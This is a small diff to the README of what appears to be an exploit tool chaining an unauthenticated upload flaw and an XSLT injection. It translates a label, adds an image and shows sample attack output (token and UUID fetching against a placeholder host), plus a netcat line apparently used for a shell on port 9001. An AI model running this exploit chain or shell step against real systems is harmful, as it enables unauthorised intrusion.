@@ -183,7 +183,7 @@ nc <target-ip> 9001
 ║   CVE-2026-63219 (Unauth Upload) + CVE-2026-58400 (XSLT)     ║
 ╚══════════════════════════════════════════════════════════════╝
 
-[*] Hedef  : http://target.example.com
+[*] Target : http://target.example.com
 [*] Fetching XSRF token...
 [+] Token  : b2014ff7-1711-4888-a865-4163cb853448
 [*] Fetching metadata UUID...
@@ -192,6 +192,8 @@ nc <target-ip> 9001
 ```
 
 ---
+
+<img width="1029" height="371" alt="image" src="https://github.com/user-attachments/assets/1e9001d1-1c5b-4128-9bc1-eb96dd854956" />
 
 ## Why Other Approaches Failed
 
